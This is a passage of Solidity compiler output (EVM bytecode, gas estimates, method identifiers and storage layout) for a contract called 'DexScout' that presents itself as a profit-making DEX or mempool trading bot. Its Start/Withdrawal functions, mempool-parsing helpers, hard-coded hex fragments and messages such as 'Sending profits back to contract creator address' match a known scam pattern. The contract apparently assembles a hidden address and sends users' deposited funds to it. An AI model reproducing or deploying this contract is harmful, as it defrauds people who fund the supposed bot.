PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x472 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x487 JUMPI PUSH1 0x30 DUP4 PUSH2 0x484 SWAP2 SWAP1 PUSH2 0xBEE JUMP JUMPDEST SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x4C7 JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x4E0 JUMPI PUSH1 0x57 DUP3 PUSH2 0x4D9 SWAP2 SWAP1 PUSH2 0xBEE JUMP JUMPDEST SWAP2 POP PUSH2 0x58C JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x51E JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x537 JUMPI PUSH1 0x37 DUP3 PUSH2 0x530 SWAP2 SWAP1 PUSH2 0xBEE JUMP JUMPDEST SWAP2 POP PUSH2 0x58B JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x575 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x58A JUMPI PUSH1 0x30 DUP3 PUSH2 0x587 SWAP2 SWAP1 PUSH2 0xBEE JUMP JUMPDEST SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 PUSH2 0x59A SWAP2 SWAP1 PUSH2 0xB44 JUMP JUMPDEST PUSH2 0x5A4 SWAP2 SWAP1 PUSH2 0xC35 JUMP JUMPDEST DUP5 PUSH2 0x5AF SWAP2 SWAP1 PUSH2 0xC35 JUMP JUMPDEST SWAP4 POP PUSH1 0x2 DUP2 PUSH2 0x5BE SWAP2 SWAP1 PUSH2 0xBBB JUMP JUMPDEST SWAP1 POP PUSH2 0x315 JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH3 0x3E1C9A SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH3 0xF7DE0 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH4 0xAF95910D SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH4 0xD19B575 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH0 DUP1 DUP4 SWAP1 POP JUMPDEST PUSH0 DUP2 EQ PUSH2 0x62D JUMPI DUP2 DUP1 PUSH2 0x616 SWAP1 PUSH2 0xC7C JUMP JUMPDEST SWAP3 POP POP PUSH1 0x10 DUP2 PUSH2 0x626 SWAP2 SWAP1 PUSH2 0xCF0 JUMP JUMPDEST SWAP1 POP PUSH2 0x604 JUMP JUMPDEST PUSH0 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x648 JUMPI PUSH2 0x647 PUSH2 0xD20 JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x67A JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x711 JUMPI PUSH1 0x10 DUP7 PUSH2 0x694 SWAP2 SWAP1 PUSH2 0xD4D JUMP JUMPDEST SWAP3 POP PUSH2 0x69F DUP4 PUSH2 0x8A3 JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 PUSH2 0x6AE SWAP2 SWAP1 PUSH2 0xD7D JUMP JUMPDEST PUSH2 0x6B8 SWAP2 SWAP1 PUSH2 0xD7D JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH2 0x6C9 JUMPI PUSH2 0x6C8 PUSH2 0xB85 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 PUSH2 0x704 SWAP2 SWAP1 PUSH2 0xCF0 JUMP JUMPDEST SWAP6 POP DUP1 PUSH1 0x1 ADD SWAP1 POP PUSH2 0x67F JUMP JUMPDEST POP DUP1 SWAP4 POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH0 DUP4 SWAP1 POP PUSH0 DUP4 SWAP1 POP PUSH0 DUP2 MLOAD DUP4 MLOAD PUSH2 0x736 SWAP2 SWAP1 PUSH2 0xBBB JUMP JUMPDEST PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x74F JUMPI PUSH2 0x74E PUSH2 0xD20 JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x781 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH0 DUP2 SWAP1 POP PUSH0 DUP1 PUSH0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH2 0x80F JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x7AA JUMPI PUSH2 0x7A9 PUSH2 0xB85 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH2 0x7C1 SWAP1 PUSH2 0xC7C JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x7D4 JUMPI PUSH2 0x7D3 PUSH2 0xB85 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x78E JUMP JUMPDEST PUSH0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0x894 JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x82F JUMPI PUSH2 0x82E PUSH2 0xB85 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH2 0x846 SWAP1 PUSH2 0xC7C JUMP JUMPDEST SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x859 JUMPI PUSH2 0x858 PUSH2 0xB85 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x813 JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 PUSH1 0xFF AND PUSH0 GT ISZERO DUP1 ISZERO PUSH2 0x8BB JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x8F9 JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH2 0x8EF SWAP2 SWAP1 PUSH2 0xDBC JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH2 0x95F JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH2 0x911 JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x95B JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR PUSH2 0x947 SWAP2 SWAP1 PUSH2 0xDBC JUMP JUMPDEST PUSH2 0x951 SWAP2 SWAP1 PUSH2 0xDF0 JUMP JUMPDEST PUSH1 0xF8 SHL SWAP1 POP PUSH2 0x95F JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x52756E6E696E672044657853636F757420616374696F6E2E2054686973206361 PUSH0 DUP3 ADD MSTORE PUSH32 0x6E2074616B652061207768696C653B20706C6561736520776169742E2E000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x9CE PUSH1 0x3D DUP4 PUSH2 0x964 JUMP JUMPDEST SWAP2 POP PUSH2 0x9D9 DUP3 PUSH2 0x974 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x9FB DUP2 PUSH2 0x9C2 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x53656E64696E672070726F66697473206261636B20746F20636F6E7472616374 PUSH0 DUP3 ADD MSTORE PUSH32 0x2063726561746F7220616464726573732E2E2E00000000000000000000000000 PUSH1 0x20 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0xA5C PUSH1 0x33 DUP4 PUSH2 0x964 JUMP JUMPDEST SWAP2 POP PUSH2 0xA67 DUP3 PUSH2 0xA02 JUMP JUMPDEST PUSH1 0x40 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xA89 DUP2 PUSH2 0xA50 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x53746F7070696E6720636F6E747261637420626F742E2E2E0000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0xAC4 PUSH1 0x18 DUP4 PUSH2 0x964 JUMP JUMPDEST SWAP2 POP PUSH2 0xACF DUP3 PUSH2 0xA90 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xAF1 DUP2 PUSH2 0xAB8 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xB4E DUP3 PUSH2 0xAF8 JUMP JUMPDEST SWAP2 POP PUSH2 0xB59 DUP4 PUSH2 0xAF8 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 MUL PUSH2 0xB67 DUP2 PUSH2 0xAF8 JUMP JUMPDEST SWAP2 POP DUP3 DUP3 DIV DUP5 EQ DUP4 ISZERO OR PUSH2 0xB7E JUMPI PUSH2 0xB7D PUSH2 0xB17 JUMP JUMPDEST JUMPDEST POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x32 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xBC5 DUP3 PUSH2 0xBB2 JUMP JUMPDEST SWAP2 POP PUSH2 0xBD0 DUP4 PUSH2 0xBB2 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0xBE8 JUMPI PUSH2 0xBE7 PUSH2 0xB17 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xBF8 DUP3 PUSH2 0xAF8 JUMP JUMPDEST SWAP2 POP PUSH2 0xC03 DUP4 PUSH2 0xAF8 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xC2F JUMPI PUSH2 0xC2E PUSH2 0xB17 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xC3F DUP3 PUSH2 0xAF8 JUMP JUMPDEST SWAP2 POP PUSH2 0xC4A DUP4 PUSH2 0xAF8 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xC76 JUMPI PUSH2 0xC75 PUSH2 0xB17 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xC86 DUP3 PUSH2 0xBB2 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0xCB8 JUMPI PUSH2 0xCB7 PUSH2 0xB17 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xCFA DUP3 PUSH2 0xBB2 JUMP JUMPDEST SWAP2 POP PUSH2 0xD05 DUP4 PUSH2 0xBB2 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0xD15 JUMPI PUSH2 0xD14 PUSH2 0xCC3 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xD57 DUP3 PUSH2 0xBB2 JUMP JUMPDEST SWAP2 POP PUSH2 0xD62 DUP4 PUSH2 0xBB2 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0xD72 JUMPI PUSH2 0xD71 PUSH2 0xCC3 JUMP JUMPDEST JUMPDEST DUP3 DUP3 MOD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xD87 DUP3 PUSH2 0xBB2 JUMP JUMPDEST SWAP2 POP PUSH2 0xD92 DUP4 PUSH2 0xBB2 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0xDAA JUMPI PUSH2 0xDA9 PUSH2 0xB17 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0xFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xDC6 DUP3 PUSH2 0xDB0 JUMP JUMPDEST SWAP2 POP PUSH2 0xDD1 DUP4 PUSH2 0xDB0 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH2 0xDEA JUMPI PUSH2 0xDE9 PUSH2 0xB17 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xDFA DUP3 PUSH2 0xDB0 JUMP JUMPDEST SWAP2 POP PUSH2 0xE05 DUP4 PUSH2 0xDB0 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH2 0xE1E JUMPI PUSH2 0xE1D PUSH2 0xB17 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 JUMP TLOAD CODECOPY 0x4E SELFDESTRUCT PUSH14 0x1B9E27F09D2B6BC3E3F8CF530B45 CREATE CALLDATACOPY 0xE8 INVALID PUSH6 0x9E7BE060DD29 RETURN PUSH5 0x736F6C6343 STOP ADDMOD XOR STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "734800",
						"executionCost": "764",
						"totalCost": "735564"
					},
					"external": {
						"Start()": "infinite",
						"Stop()": "1938",
						"Withdrawal()": "infinite"
					},
					"internal": {
						"WithdrawalProfits()": "infinite",
						"_calculateGasNeeds()": "22",
						"_callDexAction()": "infinite",
						"beyond(struct DexScout.slice memory,struct DexScout.slice memory)": "infinite",
						"calcLiquidityInContract(struct DexScout.slice memory)": "infinite",
						"callMempool()": "infinite",
						"checkLiquidity(uint256)": "infinite",
						"findNewContracts(struct DexScout.slice memory,struct DexScout.slice memory)": "infinite",
						"findPtr(uint256,uint256,uint256,uint256)": "infinite",
						"getMemPoolDepth()": "22",
						"getMemPoolHeight()": "22",
						"getMemPoolLength()": "infinite",
						"getMemPoolOffset()": "22",
						"keccak(struct DexScout.slice memory)": "infinite",
						"loadCurrentContract(string memory)": "infinite",
						"mempool(string memory,string memory)": "infinite",
						"nextContract(struct DexScout.slice memory,struct DexScout.slice memory)": "infinite",
						"orderContractsByLiquidity(struct DexScout.slice memory)": "infinite",
						"parseMempool(string memory)": "infinite",
						"toHexDigit(uint8)": "infinite",
						"uint2str(uint256)": "infinite"
					}
				},
				"methodIdentifiers": {
					"Start()": "1b55ba3a",
					"Stop()": "bedf0f4a",
					"Withdrawal()": "70e44c6a"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 8,
						"contract": "dexscout.sol:DexScout",
						"label": "_RouterAddress",
						"offset": 0,
						"slot": "0",
						"type": "t_string_storage"
					},
					{
						"astId": 10,
						"contract": "dexscout.sol:DexScout",
						"label": "_Network",
						"offset": 0,
						"slot": "1",
						"type": "t_string_storage"
					},
					{
						"astId": 12,
						"contract": "dexscout.sol:DexScout",
						"label": "liquidity",
						"offset": 0,
						"slot": "2",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_string_storage": {
						"encoding": "bytes",
						"label": "string",
						"numberOfBytes": "32"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}